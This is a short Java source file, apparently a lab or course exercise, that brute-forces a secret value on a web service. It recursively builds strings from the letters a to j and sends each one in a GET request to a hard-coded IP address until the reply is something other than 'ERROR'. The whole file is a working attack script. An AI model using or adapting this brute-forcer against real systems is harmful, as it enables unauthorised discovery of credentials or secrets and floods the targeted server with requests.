package get;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class Attack2RE {
	public boolean ejecutar=false;
	public String response="Failed Attack";
	public String At(String base, int ancho, int longmax) throws ClientProtocolException, IOException {
		String newBase="";
		if(ancho>longmax){
			return "Ancho superior a la longitud maxima";
		}
		for(int i=97;i<=106;i++){	
			newBase=base+(char)i;
			if(check(newBase)){
				response=newBase;
				ejecutar=true;
			}
			else if(ejecutar==false){
				At(newBase, ancho+1,longmax);
			}
		}
		return response;
	}
	
	public Boolean check(String result) throws ClientProtocolException, IOException{
		HttpClient client = new DefaultHttpClient();
		HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+result);
		HttpResponse response = client.execute(request);
		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
		String line = "";
		while ((line = rd.readLine()) != null) {
			System.out.println(result+" : "+line);
			if(!line.equals("ERROR")){
				return true;
            }
 		}
		return false;
	}

}